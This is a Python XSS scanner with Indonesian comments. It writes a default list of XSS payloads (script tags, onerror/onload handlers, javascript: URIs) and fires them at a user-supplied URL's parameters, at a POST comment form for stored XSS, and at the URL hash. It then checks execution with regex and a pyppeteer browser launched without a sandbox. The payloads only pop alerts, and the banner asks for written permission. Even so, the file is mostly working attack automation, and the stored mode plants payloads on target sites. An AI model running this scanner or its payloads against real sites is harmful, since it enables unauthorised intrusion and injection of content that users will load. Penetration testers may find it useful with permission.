import requests
import urllib.parse
import re
from datetime import datetime
import sys
from colorama import init, Fore, Style
import asyncio
from pyppeteer import launch
import html
import os
import time

# Inisialisasi colorama
init()

# =====================================================
# Fungsi: Load payload dari file tanpa print per baris
# =====================================================
def load_payloads_from_file(filename="payload.txt"):
    """Load payloads dari file txt dengan format yang fleksibel."""
    payloads = []
    
    # Buat file payload.txt jika belum ada
    if not os.path.exists(filename):
        default_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src=\"javascript:alert('XSS Frame')\"></iframe>",
            "%3Cscript%3Ealert('XSS Encoded')%3C%2Fscript%3E",
            "<body onload=alert('XSS Load')>",
            "<a href=\"javascript:alert(1)\">Click</a>",
            "<div onmouseover=alert(1)>Hover</div>",
            "javascript:alert(1)",
            "<input type=text onfocus=alert(1) autofocus>"
        ]
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("# XSS Payloads File - satu payload per baris\n")
            for payload in default_payloads:
                f.write(f"{payload}\n")
        print(f"{Fore.YELLOW}[*] File {filename} dibuat dengan default payloads.{Style.RESET_ALL}")
    
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    payloads.append(html.unescape(line))
        print(f"{Fore.CYAN}[*] Loaded {len(payloads)} payloads dari {filename}{Style.RESET_ALL}")
        return payloads
    except Exception as e:
        print(f"{Fore.RED}[!] Error membaca {filename}: {str(e)}{Style.RESET_ALL}")
        return []

# =====================================================
# Regex untuk deteksi eksekusi XSS
# =====================================================
script_exec_pattern = re.compile(r'<script\b[^<]*(?:(?!<\/script>)<[^<]*)*alert\([^)]*\)[^<]*</script>', re.IGNORECASE)
event_exec_pattern = re.compile(r'\bon\w+\s*=\s*[\'"][^\'"]*?(alert|prompt)\([^)]*\)[^\'"]*[\'"]', re.IGNORECASE)
js_uri_exec_pattern = re.compile(r'javascript\s*:[^\'"]*?(alert|prompt)\([^)]*\)', re.IGNORECASE)
dom_exec_pattern = re.compile(r'eval\s*\(\s*location\.hash|window\.name|document\.URL', re.IGNORECASE)
html_entity_pattern = re.compile(r'&[a-zA-Z0-9#]+;')

# =====================================================
# Fungsi bantu umum
# =====================================================
def validate_url(url):
    try:
        parsed = urllib.parse.urlparse(url)
        return parsed.scheme in ('http', 'https') and parsed.netloc
    except:
        return False

def extract_params_from_url(url):
    if not validate_url(url):
        return None, None
    parsed = urllib.parse.urlparse(url)
    params = [pair.split('=')[0] for pair in parsed.query.split('&') if '=' in pair] if parsed.query else []
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    return params, base_url

# =====================================================
# Tes payload via browser (akurasi tinggi)
# =====================================================
async def test_payload_execution(url, is_dom=False, payload="alert(1)"):
    try:
        browser = await launch(headless=False, args=['--no-sandbox', '--disable-setuid-sandbox'])
        page = await browser.newPage()
        alerts, console_msgs = [], []

        async def handle_dialog(dialog):
            alerts.append(dialog.message)
            await dialog.accept()

        page.on('dialog', handle_dialog)
        page.on('console', lambda msg: console_msgs.append(msg.text))

        await page.evaluateOnNewDocument('''
            window.alert = function(msg) {
                window.__xssTriggered = true;
                console.log("XSS Alert triggered:", msg);
            };
        ''')

        await page.goto(url, {'timeout': 12000, 'waitUntil': 'domcontentloaded'})
        if is_dom:
            await page.evaluate(f'location.hash = "{payload}"')
            await asyncio.sleep(1)

        await asyncio.sleep(1.5)
        triggered = False
        try:
            triggered = await page.evaluate('window.__xssTriggered === true')
        except Exception:
            triggered = False
        await browser.close()

        executed = triggered or any('alert' in (c or '').lower() for c in console_msgs)
        return executed, console_msgs
    except Exception as e:
        return False, [f"Browser error: {e}"]

# =====================================================
# Deteksi berdasarkan response
# =====================================================
def is_payload_executable(response_text, payload, xss_type):
    if response_text and html_entity_pattern.search(response_text) and payload not in response_text:
        return False, "Payload encoded"
    if xss_type == 'reflected':
        if script_exec_pattern.search(response_text) or event_exec_pattern.search(response_text) or js_uri_exec_pattern.search(response_text):
            return True, "Reflected executable"
    elif xss_type == 'stored':
        if payload in response_text and (script_exec_pattern.search(response_text) or event_exec_pattern.search(response_text)):
            return True, "Stored executable"
    elif xss_type == 'dom':
        if dom_exec_pattern.search(response_text):
            return True, "DOM executable"
    if payload in response_text:
        return False, "Reflected but not executed"
    return False, "No reflection"

# =====================================================
# Header keamanan
# =====================================================
def check_security_headers(response):
    if not response:
        return {}
    h = response.headers
    return {
        'CSP': h.get('Content-Security-Policy', 'None'),
        'X-XSS-Protection': h.get('X-XSS-Protection', 'None'),
        'X-Frame-Options': h.get('X-Frame-Options', 'None')
    }

# =====================================================
# Uji satu payload
# =====================================================
def test_single_payload(url, param, payload, headers, xss_type, post_data=None):
    try:
        if xss_type == 'dom':
            test_url = f"{url}#{urllib.parse.quote(payload)}"
            response = None
        elif xss_type == 'stored':
            test_url = url
            if post_data:
                pd = {k: v.replace('PAYLOAD', payload) for k, v in post_data.items()}
                requests.post(url, data=pd, headers=headers, timeout=8)
            response = requests.get(url, headers=headers, timeout=8)
        else:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            response = requests.get(test_url, headers=headers, timeout=8)

        exec_http, ctx = is_payload_executable(response.text if response else '', payload, xss_type)
        # Browser check: try but ignore errors (kecepatan & fallback)
        try:
            exec_browser, msgs = asyncio.run(test_payload_execution(test_url, xss_type == 'dom', payload))
        except Exception:
            exec_browser, msgs = False, []
        executed = exec_http or exec_browser
        context = ctx if exec_http else (msgs[0] if msgs else ctx)
        return executed, context, payload, test_url, response.status_code if response else None
    except Exception as e:
        return False, f"Error: {e}", payload, url, None

# =====================================================
# Jalankan semua payload
# =====================================================
def test_xss(url, params, xss_type, post_data=None):
    payloads = load_payloads_from_file("payload.txt")
    headers = {'User-Agent': 'Mozilla/5.0'}
    output = f"vuln_{xss_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

    with open(output, "w", encoding="utf-8") as f:
        f.write(f"Scan {xss_type} - {datetime.now()}\n\n")

    vuln_count = 0
    total = len(payloads)

    for param in (params or ['']):
        for i, payload in enumerate(payloads, 1):
            # print progress
            print(f"{Fore.MAGENTA}[{i}/{total}] Testing payload...{Style.RESET_ALL}")
            executed, context, payload, turl, status = test_single_payload(url, param, payload, headers, xss_type, post_data)
            with open(output, "a", encoding="utf-8") as f:
                if executed:
                    vuln_count += 1
                    # Vulnerability -> HIJAU + emoji peringatan
                    print(f"{Fore.GREEN}⚠️ VULNERABLE! {turl}  ({context}){Style.RESET_ALL}")
                    f.write(f"[VULN] {payload}\nURL: {turl}\nContext: {context}\nStatus: {status}\n\n")
                else:
                    # Not vulnerable -> MERAH (menandakan safe)
                    print(f"{Fore.RED}[OK] Not vulnerable for this payload ({context}){Style.RESET_ALL}")
                    f.write(f"[-] {payload[:60]}... safe ({context})\n")

    print(f"\n{Fore.CYAN}Scan complete. Results saved to: {output}{Style.RESET_ALL}")
    if vuln_count:
        print(f"{Fore.GREEN}Total vulnerabilities found: {vuln_count}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}No vulnerabilities found.{Style.RESET_ALL}")

# =====================================================
# MENU UTAMA
# =====================================================
def main():
    print(f"{Fore.RED}=== ALAT PENGUJIAN XSS ETIS ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}⚠️ Gunakan hanya dengan izin tertulis ⚠️{Style.RESET_ALL}\n")
    print("1. Reflected XSS")
    print("2. Stored XSS")
    print("3. DOM-based XSS")
    choice = input(f"{Fore.GREEN}Pilih (1/2/3): {Style.RESET_ALL}").strip()

    if choice == '1':
        url = input("Masukkan URL target (dengan ?param=): ").strip()
        params, base = extract_params_from_url(url)
        if not params:
            print(f"{Fore.RED}[!] URL tidak punya parameter valid{Style.RESET_ALL}")
            return
        test_xss(base, params, 'reflected')
    elif choice == '2':
        url = input("Masukkan URL form POST: ").strip()
        post_data = {'comment': 'PAYLOAD', 'name': 'Test', 'email': 'test@example.com'}
        test_xss(url, None, 'stored', post_data)
    elif choice == '3':
        url = input("Masukkan URL DOM target: ").strip()
        test_xss(url, None, 'dom')
    else:
        print("Pilihan tidak valid")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nDihentikan oleh user.")
